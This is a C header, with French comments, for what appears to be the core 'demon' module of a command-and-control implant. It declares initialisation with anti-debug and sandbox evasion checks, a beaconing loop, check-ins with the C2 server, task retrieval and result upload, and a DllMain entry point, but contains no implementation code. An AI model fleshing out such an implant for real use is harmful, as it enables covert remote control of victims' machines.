/*
 * demon.h - Point d'entrée et boucle principale de l'agent
 *
 * Le "demon" est le coeur de l'agent. Il gère l'initialisation,
 * la boucle de communication avec le C2, et le dispatch des tâches.
 */

#ifndef DEMON_H
#define DEMON_H

#include "../network/transport.h"
#include "../tasks/dispatcher.h"
#include "config.h"

/* Global agent context */
typedef struct {
  agent_config_t config;     /* Configuration */
  transport_ctx_t transport; /* Contexte réseau */
  bool running;              /* Flag pour la boucle principale */
  bool initialized;          /* Agent initialisé ? */
  DWORD last_checkin;        /* Timestamp du dernier check-in */
  int failed_attempts;       /* Nombre d'échecs consécutifs */
} demon_ctx_t;

/* Instance globale (déclarée dans demon.c) */
extern demon_ctx_t g_demon;

/* Prototypes */

/*
 * Initialise l'agent.
 * - Charge la config
 * - Initialise le transport
 * - Fait les checks anti-debug/sandbox
 * Retourne STATUS_SUCCESS ou un code d'erreur.
 */
int demon_init(void);

/*
 * Lance la boucle principale.
 * Cette fonction ne retourne que quand on reçoit la commande EXIT
 * ou en cas d'erreur fatale.
 */
int demon_run(void);

/*
 * Effectue un check-in auprès du C2.
 * Envoie les infos de l'agent et récupère éventuellement des tâches.
 */
int demon_checkin(void);

/*
 * Récupère les tâches en attente depuis le C2.
 */
int demon_get_tasks(task_t **tasks, int *task_count);

/*
 * Envoie le résultat d'une tâche au C2.
 */
int demon_send_result(task_result_t *result);

/*
 * Arrête proprement l'agent.
 */
void demon_shutdown(void);

/*
 * Cleanup complet.
 */
void demon_cleanup(void);

/*
 * Point d'entrée principal de l'agent.
 * Appelé depuis main() ou DllMain.
 */
int demon_main(void);

#endif /* DEMON_H */
